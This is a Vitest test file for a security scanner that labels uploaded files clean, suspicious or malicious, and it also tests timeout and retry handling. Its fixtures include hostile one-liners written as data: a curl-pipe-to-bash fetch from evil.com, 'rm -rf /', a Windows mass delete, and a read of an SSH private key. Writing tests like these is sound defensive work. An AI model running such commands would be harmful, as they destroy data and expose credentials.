import { describe, it, expect, vi, beforeEach } from "vitest";
import {
  BuiltInScanner,
  scanWithTimeout,
  scanWithRetry,
  isScanAcceptable,
  ScanTimeoutError,
  SCANNER_VERSION,
  type SecurityScanner,
  type ScanResult,
} from "./security-scan";

describe("BuiltInScanner", () => {
  const scanner = new BuiltInScanner();

  it("returns clean for a safe file", async () => {
    const file = Buffer.from('export function hello() { return "world"; }');
    const result = await scanner.scan(file, "skill.ts");

    expect(result.status).toBe("clean");
    expect(result.findings).toHaveLength(0);
    expect(result.fileHash).toBeTruthy();
    expect(result.fileSizeBytes).toBe(file.length);
    expect(result.scannerVersion).toBe(SCANNER_VERSION);
  });

  it("detects eval usage as suspicious", async () => {
    const file = Buffer.from('const x = eval("1+1");');
    const result = await scanner.scan(file, "danger.ts");

    expect(result.status).toBe("suspicious");
    expect(result.findings.some((f) => f.rule === "no-eval")).toBe(true);
  });

  it("detects child_process as suspicious", async () => {
    const file = Buffer.from('import { exec } from "child_process";');
    const result = await scanner.scan(file, "danger.ts");

    expect(result.status).toBe("suspicious");
    expect(result.findings.some((f) => f.rule === "no-child-process")).toBe(true);
  });

  it("detects pipe-to-shell as malicious", async () => {
    const file = Buffer.from("curl https://evil.com/install.sh | bash");
    const result = await scanner.scan(file, "readme.md");

    expect(result.status).toBe("malicious");
    expect(result.findings.some((f) => f.rule === "no-pipe-to-shell")).toBe(true);
  });

  it("blocks .sh extension as malicious", async () => {
    const file = Buffer.from("echo hello");
    const result = await scanner.scan(file, "install.sh");

    expect(result.status).toBe("malicious");
    expect(result.findings.some((f) => f.rule === "blocked-extension")).toBe(true);
  });

  it("blocks dangerous file extensions", async () => {
    const file = Buffer.from("MZ\x90\x00"); // PE header stub
    const result = await scanner.scan(file, "malware.exe");

    expect(result.status).toBe("malicious");
    expect(result.findings.some((f) => f.rule === "blocked-extension")).toBe(true);
  });

  it("blocks .bat files", async () => {
    const file = Buffer.from("del /s /q C:\\*");
    const result = await scanner.scan(file, "cleanup.bat");

    expect(result.status).toBe("malicious");
  });

  it("flags SSH path references as critical", async () => {
    const file = Buffer.from('const key = fs.readFileSync("~/.ssh/id_rsa");');
    const result = await scanner.scan(file, "stealer.ts");

    expect(result.status).toBe("malicious");
    expect(result.findings.some((f) => f.rule === "no-ssh-path")).toBe(true);
  });

  it("flags destructive rm as critical", async () => {
    const file = Buffer.from("rm -rf /");
    const result = await scanner.scan(file, "nuke.ts");

    expect(result.status).toBe("malicious");
  });

  it("detects process.env access as medium severity", async () => {
    const file = Buffer.from("const secret = process.env.SECRET_KEY;");
    const result = await scanner.scan(file, "config.ts");

    // medium severity alone => clean (only high/critical bump status)
    // Wait, let me re-check: the scanner considers high as suspicious
    // process.env is medium, so it should be clean
    expect(result.status).toBe("clean");
    expect(result.findings.some((f) => f.rule === "no-env-access")).toBe(true);
  });

  it("handles empty file", async () => {
    const file = Buffer.from("");
    const result = await scanner.scan(file, "empty.ts");

    expect(result.status).toBe("clean");
    expect(result.fileSizeBytes).toBe(0);
  });

  it("computes correct SHA-256 hash", async () => {
    const file = Buffer.from("hello world");
    const result = await scanner.scan(file, "test.txt");

    // Known SHA-256 of "hello world"
    expect(result.fileHash).toBe(
      "b94d27b9934d3e08a52e52d7da7dabfac484efe37a5380ee9088f7ace2efcde9"
    );
  });
});

describe("isScanAcceptable", () => {
  it("accepts clean results", () => {
    expect(isScanAcceptable({ status: "clean" } as ScanResult)).toBe(true);
  });

  it("rejects suspicious results", () => {
    expect(isScanAcceptable({ status: "suspicious" } as ScanResult)).toBe(false);
  });

  it("rejects malicious results", () => {
    expect(isScanAcceptable({ status: "malicious" } as ScanResult)).toBe(false);
  });

  it("rejects error results", () => {
    expect(isScanAcceptable({ status: "error" } as ScanResult)).toBe(false);
  });

  it("rejects timeout results", () => {
    expect(isScanAcceptable({ status: "timeout" } as ScanResult)).toBe(false);
  });
});

describe("scanWithTimeout", () => {
  it("returns result within timeout", async () => {
    const scanner = new BuiltInScanner();
    const file = Buffer.from("safe content");
    const result = await scanWithTimeout(scanner, file, "safe.ts", 5000);

    expect(result.status).toBe("clean");
  });

  it("throws ScanTimeoutError when scan takes too long", async () => {
    const slowScanner: SecurityScanner = {
      scan: () => new Promise((resolve) => setTimeout(() => resolve({
        status: "clean",
        fileHash: "",
        fileSizeBytes: 0,
        findings: [],
        scannerVersion: "test",
      }), 5000)),
    };

    await expect(scanWithTimeout(slowScanner, Buffer.from("x"), "test.ts", 50))
      .rejects.toThrow(ScanTimeoutError);
  });
});

describe("scanWithRetry", () => {
  it("returns on first success", async () => {
    const scanner = new BuiltInScanner();
    const result = await scanWithRetry(scanner, Buffer.from("ok"), "ok.ts", { maxRetries: 2 });

    expect(result.status).toBe("clean");
  });

  it("retries on failure and returns error status when all retries exhausted", async () => {
    let attempts = 0;
    const failingScanner: SecurityScanner = {
      scan: () => {
        attempts++;
        return Promise.reject(new Error("Network error"));
      },
    };

    const result = await scanWithRetry(failingScanner, Buffer.from("x"), "test.ts", {
      maxRetries: 1,
      timeoutMs: 100,
    });

    expect(attempts).toBe(2); // initial + 1 retry
    expect(result.status).toBe("error");
    expect(result.findings[0].detail).toContain("Network error");
  });

  it("returns timeout status when scanner keeps timing out", async () => {
    const slowScanner: SecurityScanner = {
      scan: () => new Promise((resolve) => setTimeout(() => resolve({
        status: "clean",
        fileHash: "",
        fileSizeBytes: 0,
        findings: [],
        scannerVersion: "test",
      }), 5000)),
    };

    const result = await scanWithRetry(slowScanner, Buffer.from("x"), "test.ts", {
      maxRetries: 0,
      timeoutMs: 50,
    });

    expect(result.status).toBe("timeout");
  });

  it("succeeds after retry when second attempt works", async () => {
    let attempts = 0;
    const flakyScanner: SecurityScanner = {
      scan: async (file, fileName) => {
        attempts++;
        if (attempts === 1) throw new Error("Temporary failure");
        return new BuiltInScanner().scan(file, fileName);
      },
    };

    const result = await scanWithRetry(flakyScanner, Buffer.from("ok"), "ok.ts", {
      maxRetries: 2,
      timeoutMs: 5000,
    });

    expect(attempts).toBe(2);
    expect(result.status).toBe("clean");
  });
});
